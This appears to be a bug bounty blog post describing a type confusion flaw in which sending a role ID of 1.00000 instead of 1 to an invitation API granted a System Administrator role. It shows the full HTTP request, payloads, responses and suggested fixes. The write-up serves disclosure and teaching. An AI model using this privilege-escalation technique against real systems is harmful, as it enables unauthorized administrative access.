---
title: How I Tricked the System with Type Confusion and Became a System Admin (Briefly)
description: A brief story of how a Type Confusion vulnerability allowed privilege escalation in a real-world scenario.
summary: Discover how a type confusion bug allowed privilege escalation to a System Administrator role by simply tweaking a numeric value in an API request.
date: 2025-03-24
read_time: 5 min
image: https://miro.medium.com/v2/resize:fit:720/format:webp/1*SAY1UW6kMzBqE5t9z7ZNBg.jpeg
tags:
  - Type Confusion
  - Privilege Escalation
  - Security
  - Bug Bounty
  - CTF
  - Vulnerabilities
  - Real-World Stories
---

Originally published on Medium: [https://00xmora.medium.com/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly-72ad2ce08061](https://00xmora.medium.com/how-i-tricked-the-system-with-type-confusion-and-became-a-system-admin-briefly-72ad2ce08061)

---

## Prologue: A Hacker's Curiosity

As security researchers, we live for those moments of discovery — the subtle gaps in logic, the overlooked edge cases that turn into major vulnerabilities.

This is the story of how a simple data type discrepancy allowed me to bypass access controls and assign myself a **System Administrator** role for an entire organization.

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*SAY1UW6kMzBqE5t9z7ZNBg.jpeg)
---

## Understanding Type Confusion

Type Confusion occurs when a program mistakenly treats one type of data as another, leading to unintended behavior.

Languages that support **loose typing**, like JavaScript and Python, are particularly vulnerable.

### Example in JavaScript:

```js
let role = "1";
if (role == 1) {
    console.log("Access granted");
} else {
    console.log("Access denied");
}
````

Even though `role` is a string (`"1"`), JavaScript's loose equality operator `==` coerces it into an integer (`1`), causing unintended access.

Correct way (strict type check):

```js
if (role === 1) {
    console.log("Access granted");
} else {
    console.log("Access denied");
}
```

---

## The Discovery: A Tale of Two Data Types

It all started with a routine inspection of an **invitation system's API**.
My goal? To see how roles were assigned during user invitations.

The `role_id` parameter caught my attention. It was an array, and at first glance, it seemed well-restricted.

### Available frontend roles:

* `3` – Admin
* `4` – Manager
* `5` – User

Trying a non-existing role like `2`:

```
400 Bad Request
```

Then I sent this request:

```http
POST /target/sms/v1/379831/invitation HTTP/2
Host: api.stg.target.com
Content-Type: application/json
Auth: Bearer <valid_token>

{
  "org_id": [379831],
  "role_id": [1],
  "user": {"email": "testuser@example.com"},
  "invitation_authentication_type": ["cred"],
  "is_new": false
}
```

Response:

```
403 Forbidden
```
![403](https://miro.medium.com/v2/resize:fit:720/format:webp/1*x1lK4hsPtdClXT4cK80HNw.png)

This caught my eye – `403` means **access denied**, but the role exists.

If `1` were **completely invalid**, I would expect a `400 Bad Request` like I saw with `2`.

---

## The Bypass: When `1` ≠ `1.00000`

I slightly changed the payload:

```json
{
  "role_id": [1.00000]
}
```

The response:

```
200 OK
```

![200 ok ](https://miro.medium.com/v2/resize:fit:720/format:webp/1*nmybvn8RV2_BLvxarLj7Cw.png)

And shortly after…
An invitation email confirming my **System Administrator** role arrived.

This was it. I had admin privileges over an entire organization!

![invite](https://miro.medium.com/v2/resize:fit:640/format:webp/1*hvfTElW82iAw-NmmCAIoeQ.png)

---

## Why Did This Happen?

The backend probably enforced strict checks on integers like `1`,
but when presented with `1.00000`, it might’ve coerced the value into a float or different representation that **bypassed** validation logic.

This is **Type Confusion** in action.

### How It Happens in Different Languages:

* **JavaScript:** `1 == "1"` → `true`
* **Python:** `int(1.00000) == 1` → `true`
* **C++:** Improper casting can lead to **memory corruption**

---

## The Potential Impact

If this flaw were fully exploitable, attackers could:

* Escalate privileges to **System Administrator**
* Assign **admin roles** to unauthorized users
* Gain **unrestricted access** to internal data

A small oversight, **massive implications**.

---

## How to Fix It

* **Strict Type Validation:** Enforce correct types on backend.
* **Input Normalization:** Sanitize & convert inputs before using them.
* **Authorization Checks:** Don’t rely on just value types — check if the user has **permission** to assign roles.

---

## Epilogue: The Reality of Bug Bounties

The report was **acknowledged but closed as a duplicate**.

Disappointing? Sure.
But also a reminder: **even tiny data inconsistencies** can lead to serious vulnerabilities.

For every closed report, there's another undiscovered flaw waiting to be found.

Until next time, stay curious, stay ethical, and keep hacking.